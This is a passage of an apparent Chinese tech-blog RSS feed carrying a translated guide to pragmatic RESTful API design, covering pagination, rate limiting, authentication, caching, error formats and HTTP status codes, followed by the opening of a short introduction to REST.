&lt;p&gt;JSONP的请求跟着一个额外的查询参数（通常叫做&lt;code class=&quot;highlighter-rouge&quot;&gt;callback&lt;/code&gt;或者&lt;code class=&quot;highlighter-rouge&quot;&gt;jsonp&lt;/code&gt;），用来表示回调函数的名字。如果这个参数传了的话，API应该在响应内容的外层嵌套大括号，通常都是返回200状态码，然后把真正的状态码放在JSON内容中。任何其他需要随着响应内容返回的HTTP header应该放在JSON字段里边，像这样：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;callback_function({
  status_code: 200,
  next_page: &quot;https://..&quot;,
  response: {
    ... actual JSON response body ...
  }
})
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;类似地，如果想要支持受限的HTTP客户端，可以提供一个额外的查询参数&lt;code class=&quot;highlighter-rouge&quot;&gt;?envelope=true&lt;/code&gt;，这将会在响应内容外层嵌套大括号（没有JSONP回调函数）。&lt;/p&gt;

&lt;h2 id=&quot;json-requests&quot;&gt;对POST、PUT和PATCH方法的body使用JSON格式&lt;/h2&gt;

&lt;p&gt;如果你正在使用本文所介绍的方案，那么你的API输出的内容都是JSON格式。让我们考虑考虑在API输入的地方也使用JSON。&lt;/p&gt;

&lt;p&gt;大部分API在请求body中都使用URL编码规则。URL编码规则跟它的字面意思一样 - 请求body中的键值对所使用的编码规则跟URL查询参数使用的一样。这个编码规则简单，支持的范围广并且能把事情搞定。&lt;/p&gt;

&lt;p&gt;但是，URL编码存在一些问题。它没有数据类型的概念。这会强制API把整型和布尔类型转换成字符类型。而且，它没有真正的层级结构体的概念。尽管有一些惯例可以从键值对构建出一些结构体（比如在key后面追加一个[]符号来表示一个数组），但是这不能跟JSON原生的层级结构体相提并论。&lt;/p&gt;

&lt;p&gt;如果API很简单，URL编码足够。但是，复杂的API应该使用JSON作为API的输入。不管怎么样，选择一个编码然后保证整个API都用这个就好了。&lt;/p&gt;

&lt;p&gt;一个API如果接受JSON编码的POST、PUT和PATCH请求，需要保证接收到的请求头&lt;code class=&quot;highlighter-rouge&quot;&gt;Content-Type&lt;/code&gt;的内容为&lt;code class=&quot;highlighter-rouge&quot;&gt;application/json&lt;/code&gt;，不然就返回&lt;code class=&quot;highlighter-rouge&quot;&gt;415 Unsupported Media Type&lt;/code&gt;HTTP状态码。&lt;/p&gt;

&lt;h2 id=&quot;pagination&quot;&gt;分页&lt;/h2&gt;

&lt;p&gt;喜欢在返回结果外层嵌套大括号的API通常会在大括号中包含分页数据。我并不会责备它们 - 因为到目前为止，没有更好的方案了。现如今包含详细分页信息的正确做法是使用&lt;a href=&quot;http://tools.ietf.org/html/rfc5988#page-6&quot;&gt;RFC 5988提出的Link header&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;使用Link header的API可以返回能直接访问的链接，这样API消费者不需要再自己构造链接了。这对于&lt;a href=&quot;https://developers.facebook.com/docs/reference/api/pagination/&quot;&gt;基于游标&lt;/a&gt;（cursor based）的分页策略尤其重要。这有一个正确使用Link header的例子，从&lt;a href=&quot;http://developer.github.com/v3/#pagination&quot;&gt;GitHub&lt;/a&gt;的文档上扒的：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Link: &amp;lt;https://api.github.com/user/repos?page=3&amp;amp;per_page=100&amp;gt;; rel=&quot;next&quot;,&amp;lt;https://api.github.com/user/repos?page=50&amp;amp;per_page=100&amp;gt;; rel=&quot;last&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;但是这并不是一个万能的方案，因为很多的API会返回额外的分页信息，比如剩余结果的总数。API如果必须要返回这个数量可以使用自定义的HTTP header
&lt;code class=&quot;highlighter-rouge&quot;&gt;X-Total-Count&lt;/code&gt;。&lt;/p&gt;

&lt;h2 id=&quot;autoloading&quot;&gt;自动加载相关资源的内容&lt;/h2&gt;

&lt;p&gt;很多情况下API消费者需要加载跟请求的资源相关（或者相互依赖）的资源。比起为了获取这个相关资源的信息而对API进行重复请求，在原始资源的响应内容中包含相关资源的数据是一个效率很高的做法。&lt;/p&gt;

&lt;p&gt;但是，这么做会&lt;a href=&quot;http://idbentley.com/blog/2013/03/14/should-restful-apis-include-relationships/&quot;&gt;违反一些RESTful原则&lt;/a&gt;，为了尽可能满足RESTful原则我们可以通过&lt;code class=&quot;highlighter-rouge&quot;&gt;embed&lt;/code&gt;（或&lt;code class=&quot;highlighter-rouge&quot;&gt;expand&lt;/code&gt;）查询参数来实现。&lt;/p&gt;

&lt;p&gt;在这种情况下，&lt;code class=&quot;highlighter-rouge&quot;&gt;embed&lt;/code&gt;参数的内容可以是想要被包含的以逗号分隔的字段列表。点操作符用来指明字段的属性。比如：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /tickets/12?embed=customer.name,assigned_user
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这个调用将会返回一个包含额外信息的ticket，比如：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;12&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;subject&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;I have a question!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;summary&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Hi, ....&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;customer&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Bob&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;assigned_user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;42&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Jim&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;当然，是不是能实现这个功能取决于内部系统的复杂性。这类功能可能会引起&lt;a href=&quot;http://stackoverflow.com/questions/97197/what-is-the-n1-selects-issue&quot;&gt;N+1查询问题&lt;/a&gt;。&lt;/p&gt;

&lt;h2 id=&quot;method-override&quot;&gt;覆盖HTTP方法&lt;/h2&gt;

&lt;p&gt;一些HTTP客户端只支持GET和POST请求。为了能够加强这些客户端的访问能力，API需要能够覆盖HTTP方法。尽管这里没有任何强制的标准，但流行的做法是API会接收一个请求头&lt;code class=&quot;highlighter-rouge&quot;&gt;X-HTTP-Method-Override&lt;/code&gt;，它的值可以是PUT、PATCH或者DELETE三者之一。&lt;/p&gt;

&lt;p&gt;注意，用来覆盖HTTP方法的header只能在POST请求中被接受。GET请求永远&lt;a href=&quot;http://programmers.stackexchange.com/questions/188860/why-shouldnt-a-get-request-change-data-on-the-server&quot;&gt;不能修改服务器上的数据&lt;/a&gt;。&lt;/p&gt;

&lt;h2 id=&quot;rate-limiting&quot;&gt;请求频次限制&lt;/h2&gt;

&lt;p&gt;为了防止滥用，给API加上请求频次限制是标准做法。&lt;a href=&quot;http://tools.ietf.org/html/rfc6585&quot;&gt;RFC 6585&lt;/a&gt;引入了一个HTTP状态码&lt;a href=&quot;http://tools.ietf.org/html/rfc6585#section-4&quot;&gt;429 Too Many Requests&lt;/a&gt;来解决这个问题。&lt;/p&gt;

&lt;p&gt;当然，如果能在达到调用上限之前通知到消费者肯定更好。当前这个领域缺少一些标准，但是很多流行的做法是&lt;a href=&quot;http://stackoverflow.com/questions/16022624/examples-of-http-api-rate-limiting-http-response-headers&quot;&gt;使用HTTP响应header&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;至少得包含以下header（使用Twitter&lt;a href=&quot;https://dev.twitter.com/docs/rate-limiting/1.1&quot;&gt;命名规则&lt;/a&gt;，header的中间词不需要大写）：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;X-Rate-Limit-Limit - 当前时间段内允许的请求次数&lt;/li&gt;
  &lt;li&gt;X-Rate-Limit-Remaining - 当前时间段内剩下的请求次数&lt;/li&gt;
  &lt;li&gt;X-Rate-Limit-Reset - 当前时间段还剩下多少秒（也就是还有多久会重置请求限制的次数）&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;x-rate-limit-resettimestamp&quot;&gt;为什么X-Rate-Limit-Reset使用的是剩下的秒数而不是时间戳（timestamp）？&lt;/h3&gt;

&lt;p&gt;时间戳包含了很多有用但是非必需的信息，比如日期和时区。API消费者真正想知道的是他们什么时候可以继续发起请求，使用秒对于消费者来说处理的成本最小。并且使用秒也避免了&lt;a href=&quot;http://en.wikipedia.org/wiki/Clock_skew&quot;&gt;时钟偏移问题&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;一些API在&lt;code class=&quot;highlighter-rouge&quot;&gt;X-Rate-Limit-Reset&lt;/code&gt;中使用UNIX时间戳（从1970年1月1日(UTC)到现在的秒数）。别这么做！&lt;/p&gt;

&lt;h3 id=&quot;x-rate-limit-resetunix&quot;&gt;为什么说在&lt;code class=&quot;highlighter-rouge&quot;&gt;X-Rate-Limit-Reset&lt;/code&gt;中使用UNIX时间戳是个坏主意？&lt;/h3&gt;

&lt;p&gt;&lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616.txt&quot;&gt;HTTP标准&lt;/a&gt;中已经&lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.3&quot;&gt;规定&lt;/a&gt;要使用&lt;a href=&quot;http://www.ietf.org/rfc/rfc1123.txt&quot;&gt;RFC 1123日期格式&lt;/a&gt;（已经在&lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.18&quot;&gt;Date&lt;/a&gt;、&lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.25&quot;&gt;If-Modified-Since&lt;/a&gt;和&lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.29&quot;&gt;Last-Modified&lt;/a&gt;等header中使用）。如果我们想要指定一个新的HTTP header，那么应该遵循RFC 1123规定而不是使用UNIX时间戳。&lt;/p&gt;

&lt;h2 id=&quot;authentication&quot;&gt;认证&lt;/h2&gt;

&lt;p&gt;RESTful API应该是无状态。这意味着对请求的认证不应该基于cookie或者session。相反，每个请求应该带有一些认证凭证。&lt;/p&gt;

&lt;p&gt;如果一直使用SSL，认证凭证可以简单的使用随机生成的access token，把其做为HTTP Basic Auth中user name字段的值传给API。这么做的好处是可以通过浏览器访问 - 如果浏览器从服务器收到&lt;code class=&quot;highlighter-rouge&quot;&gt;401 Unauthorized&lt;/code&gt;状态码，它将会弹出一个对话框让人输出认证凭证。&lt;/p&gt;

&lt;p&gt;当然，这种基于token来进行基本认证的方法只能当用户从API管理后台拷贝了一个token到自己的代码中才行。如果搞不到token，只能使用&lt;a href=&quot;http://oauth.net/2/&quot;&gt;OAuth 2&lt;/a&gt;来把安全token传递给第三方。OAuth 2使用&lt;a href=&quot;http://tools.ietf.org/html/rfc6750&quot;&gt;Bearer token&lt;/a&gt;，并且也是基于SSL来保证传输安全。&lt;/p&gt;

&lt;p&gt;支持JSONP的API可能需要第三种方法来实现认证，因为JSONP的请求没法发送HTTP Basic Auth凭证或者Bearer token。这种情况下，可以使用一个额外的查询参数&lt;code class=&quot;highlighter-rouge&quot;&gt;access_token&lt;/code&gt;。注意：使用查询参数来传递token存在一个固有的安全隐患，因为大多数web服务器会在服务器日志中保存查询参数。&lt;/p&gt;

&lt;p&gt;不管怎么样，以上三种方法是用来在API之间传输token的方法。实际传输的token可以是一样的。&lt;/p&gt;

&lt;h2 id=&quot;caching&quot;&gt;缓存&lt;/h2&gt;

&lt;p&gt;HTTP内置了缓存策略。你只需要在API响应中增加几个header，在处理请求的时候对一些请求header做点校验。&lt;/p&gt;

&lt;p&gt;这有两个方案：&lt;a href=&quot;http://en.wikipedia.org/wiki/HTTP_ETag&quot;&gt;ETag&lt;/a&gt;和&lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.29&quot;&gt;Last-Modified&lt;/a&gt;&lt;/p&gt;

&lt;h3 id=&quot;etag&quot;&gt;ETag：&lt;/h3&gt;

&lt;p&gt;当处理一个请求的时候，在响应中包含一个名为&lt;code class=&quot;highlighter-rouge&quot;&gt;ETag&lt;/code&gt;的HTTP header，它的值可以为资源内容的hash或者checksum。ETag的值应该在资源内容发生变化的时候跟着变化。如果HTTP请求中包含&lt;code class=&quot;highlighter-rouge&quot;&gt;If-None-Match&lt;/code&gt;header，并且这个header的值与被请求资源的ETag值相同，那么API应该返回&lt;code class=&quot;highlighter-rouge&quot;&gt;304 Not Modified&lt;/code&gt;状态码，而不是输出资源内容。&lt;/p&gt;

&lt;h3 id=&quot;last-modified&quot;&gt;Last-Modified：&lt;/h3&gt;

&lt;p&gt;基本上跟ETag的工作原理差不多，区别在于这个header使用的是时间戳。响应header&lt;code class=&quot;highlighter-rouge&quot;&gt;Last-Modified&lt;/code&gt;中包含一个&lt;a href=&quot;http://www.ietf.org/rfc/rfc1123.txt&quot;&gt;RFC 1123&lt;/a&gt;格式的时间戳，用来对&lt;code class=&quot;highlighter-rouge&quot;&gt;If-Modified-Since&lt;/code&gt;的值进行校验。注意HTTP协议接受&lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616-sec3.html#sec3.3&quot;&gt;三种不同的日期格式&lt;/a&gt;，所以对这三种格式服务器应该都能处理。&lt;/p&gt;

&lt;h2 id=&quot;errors&quot;&gt;错误处理&lt;/h2&gt;

&lt;p&gt;就像HTML的出错页面向访问者展示了有用的错误消息一样，API也应该用之前熟悉易读的格式来提供有用的错误消息。错误的表现形式应该跟其他资源保持一致，只是用一些自己的字段。&lt;/p&gt;

&lt;p&gt;API应该一直返回合理的HTTP状态码。API错误一般情况下分成两类：代表客户端错误的400系列状态码和代表服务端错误的500系列状态码。API至少把所有400系列错误统一用易读的JSON格式来展示。如果可能（比如，如果负载均衡和反向代理能够创建自定义错误内容的话），500系列的状态码也这么弄。&lt;/p&gt;

&lt;p&gt;JSON错误内容应该为开发者提供一些东西 - 有用的错误消息，唯一的错误码（通过它可以在文档中找到更多错误细节），可能的话提供错误细节描述。用JSON格式来输出错误看起来这样：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;code&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1234&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Something bad happened :(&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;description&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;More details about the error here&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;对于PUT、PATCH和POST的请求进行的校验错误需要嵌套多个字段。最佳做法是用固定的错误码来表示校验失败，然后在额外的&lt;code class=&quot;highlighter-rouge&quot;&gt;errors&lt;/code&gt;字段中提供错误的细节，像这样：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;code&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1024&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Validation Failed&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;errors&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;code&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5432&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;field&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;first_name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;First name cannot have fancy characters&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
       &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;code&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5622&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
       &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;field&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;password&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
       &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;message&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Password cannot be blank&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
  &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;http-status&quot;&gt;HTTP状态码&lt;/h2&gt;

&lt;p&gt;HTTP定义了很多&lt;a href=&quot;http://en.wikipedia.org/wiki/List_of_HTTP_status_codes&quot;&gt;有意义的状态码&lt;/a&gt;，你可以在你的API中使用。这些状态码可以帮助API消费者用来路由它们获取到的响应内容。我整理了一个你肯定会用到的状态码列表：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;200 OK - 对成功的GET、PUT、PATCH或DELETE操作进行响应。也可以被用在不创建新资源的POST操作上&lt;/li&gt;
  &lt;li&gt;201 Created - 对创建新资源的POST操作进行响应。应该带着指向新资源地址的&lt;a href=&quot;http://www.w3.org/Protocols/rfc2616/rfc2616-sec14.html#sec14.30&quot;&gt;Location header&lt;/a&gt;
&lt;/li&gt;
  &lt;li&gt;204 No Content - 对不会返回响应体的成功请求进行响应（比如DELETE请求）&lt;/li&gt;
  &lt;li&gt;304 Not Modified - HTTP缓存header生效的时候用&lt;/li&gt;
  &lt;li&gt;400 Bad Request - 请求异常，比如请求中的body无法解析&lt;/li&gt;
  &lt;li&gt;401 Unauthorized - 没有进行认证或者认证非法。当API通过浏览器访问的时候，可以用来弹出一个认证对话框&lt;/li&gt;
  &lt;li&gt;403 Forbidden - 当认证成功，但是认证过的用户没有访问资源的权限&lt;/li&gt;
  &lt;li&gt;404 Not Found - 当一个不存在的资源被请求&lt;/li&gt;
  &lt;li&gt;405 Method Not Allowed - 所请求的HTTP方法不允许当前认证用户访问&lt;/li&gt;
  &lt;li&gt;410 Gone - 表示当前请求的资源不再可用。当调用老版本API的时候很有用&lt;/li&gt;
  &lt;li&gt;415 Unsupported Media Type - 如果请求中的内容类型是错误的&lt;/li&gt;
  &lt;li&gt;422 Unprocessable Entity - 用来表示校验错误&lt;/li&gt;
  &lt;li&gt;429 Too Many Requests - 由于请求频次达到上限而被拒绝访问&lt;/li&gt;
&lt;/ul&gt;

    （全文完）

	&lt;!-- disqus start --&gt;
	
	
	
	
	&lt;!-- disqus end --&gt;

	&lt;!-- related start --&gt;
	
	&lt;!-- related end --&gt;

</description>
        <pubDate>Tue, 15 Nov 2016 00:00:00 +0800</pubDate>
        <link>http://iftti.com/posts/2016/2016-11-15-best-practices-for-a-pragmatic-restful-api.html-53c13446d.html</link>
        <guid isPermaLink="true">http://iftti.com/posts/2016/2016-11-15-best-practices-for-a-pragmatic-restful-api.html-53c13446d.html</guid>
        
        
        <category>weizhifeng</category>
        
      </item>
    
      <item>
        <title>REST简介</title>
        <description>

	
	

	&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/544394fbc801eb0955bf47cb037999f8.jpg&quot; alt=&quot;REST&quot; title=&quot;REST&quot;&gt;&lt;/p&gt;

&lt;p&gt;REST是Representational state transfer的简称，中文直译过来是『可视化状态转移』或者『具象状态传输』，一眼看上起一头雾水，什么鬼？虽然这个概念很晦涩，但是几乎所有的程序员都用过REST风格的API，比如Github的&lt;a href=&quot;https://developer.github.com/v3/gists/&quot;&gt;REST API&lt;/a&gt;。&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-ruby&quot; data-lang=&quot;ruby&quot;&gt;&lt;span class=&quot;no&quot;&gt;GET&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/users/&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:username&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gists&lt;/span&gt;
&lt;span class=&quot;no&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;sr&quot;&gt;/gists
DELETE /&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gists&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;ss&quot;&gt;:id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;star&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;一提到REST或者实现一个RESTful API，大家可能都会通过HTTP来实现，以至于很多人把REST等同于HTTP。这个困惑可能很多人都存在，而且REST和HTTP之间也是有着不可割舍的关系，因为这二者的作者（或共同作者）是同一个人：&lt;a href=&quot;https://en.wikipedia.org/wiki/Roy_Fielding&quot;&gt;Roy Fielding&lt;/a&gt;。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/images/weizhifeng.net/0e6cf4f77b39dfd26ef8dbed6079b1a1.jpg&quot; alt=&quot;Roy Fielding&quot; title=&quot;Roy Fielding&quot;&gt;&lt;/p&gt;

&lt;p&gt;Representational State Transfer (REST）这个概念是2000年Roy Fielding在他的博士论文&lt;a href=&quot;http://www.ics.uci.edu/~fielding/pubs/dissertation/rest_arch_style.htm&quot;&gt;《Architectural Styles and the Design of Network-based Software Architectures》&lt;/a&gt;中提出的。
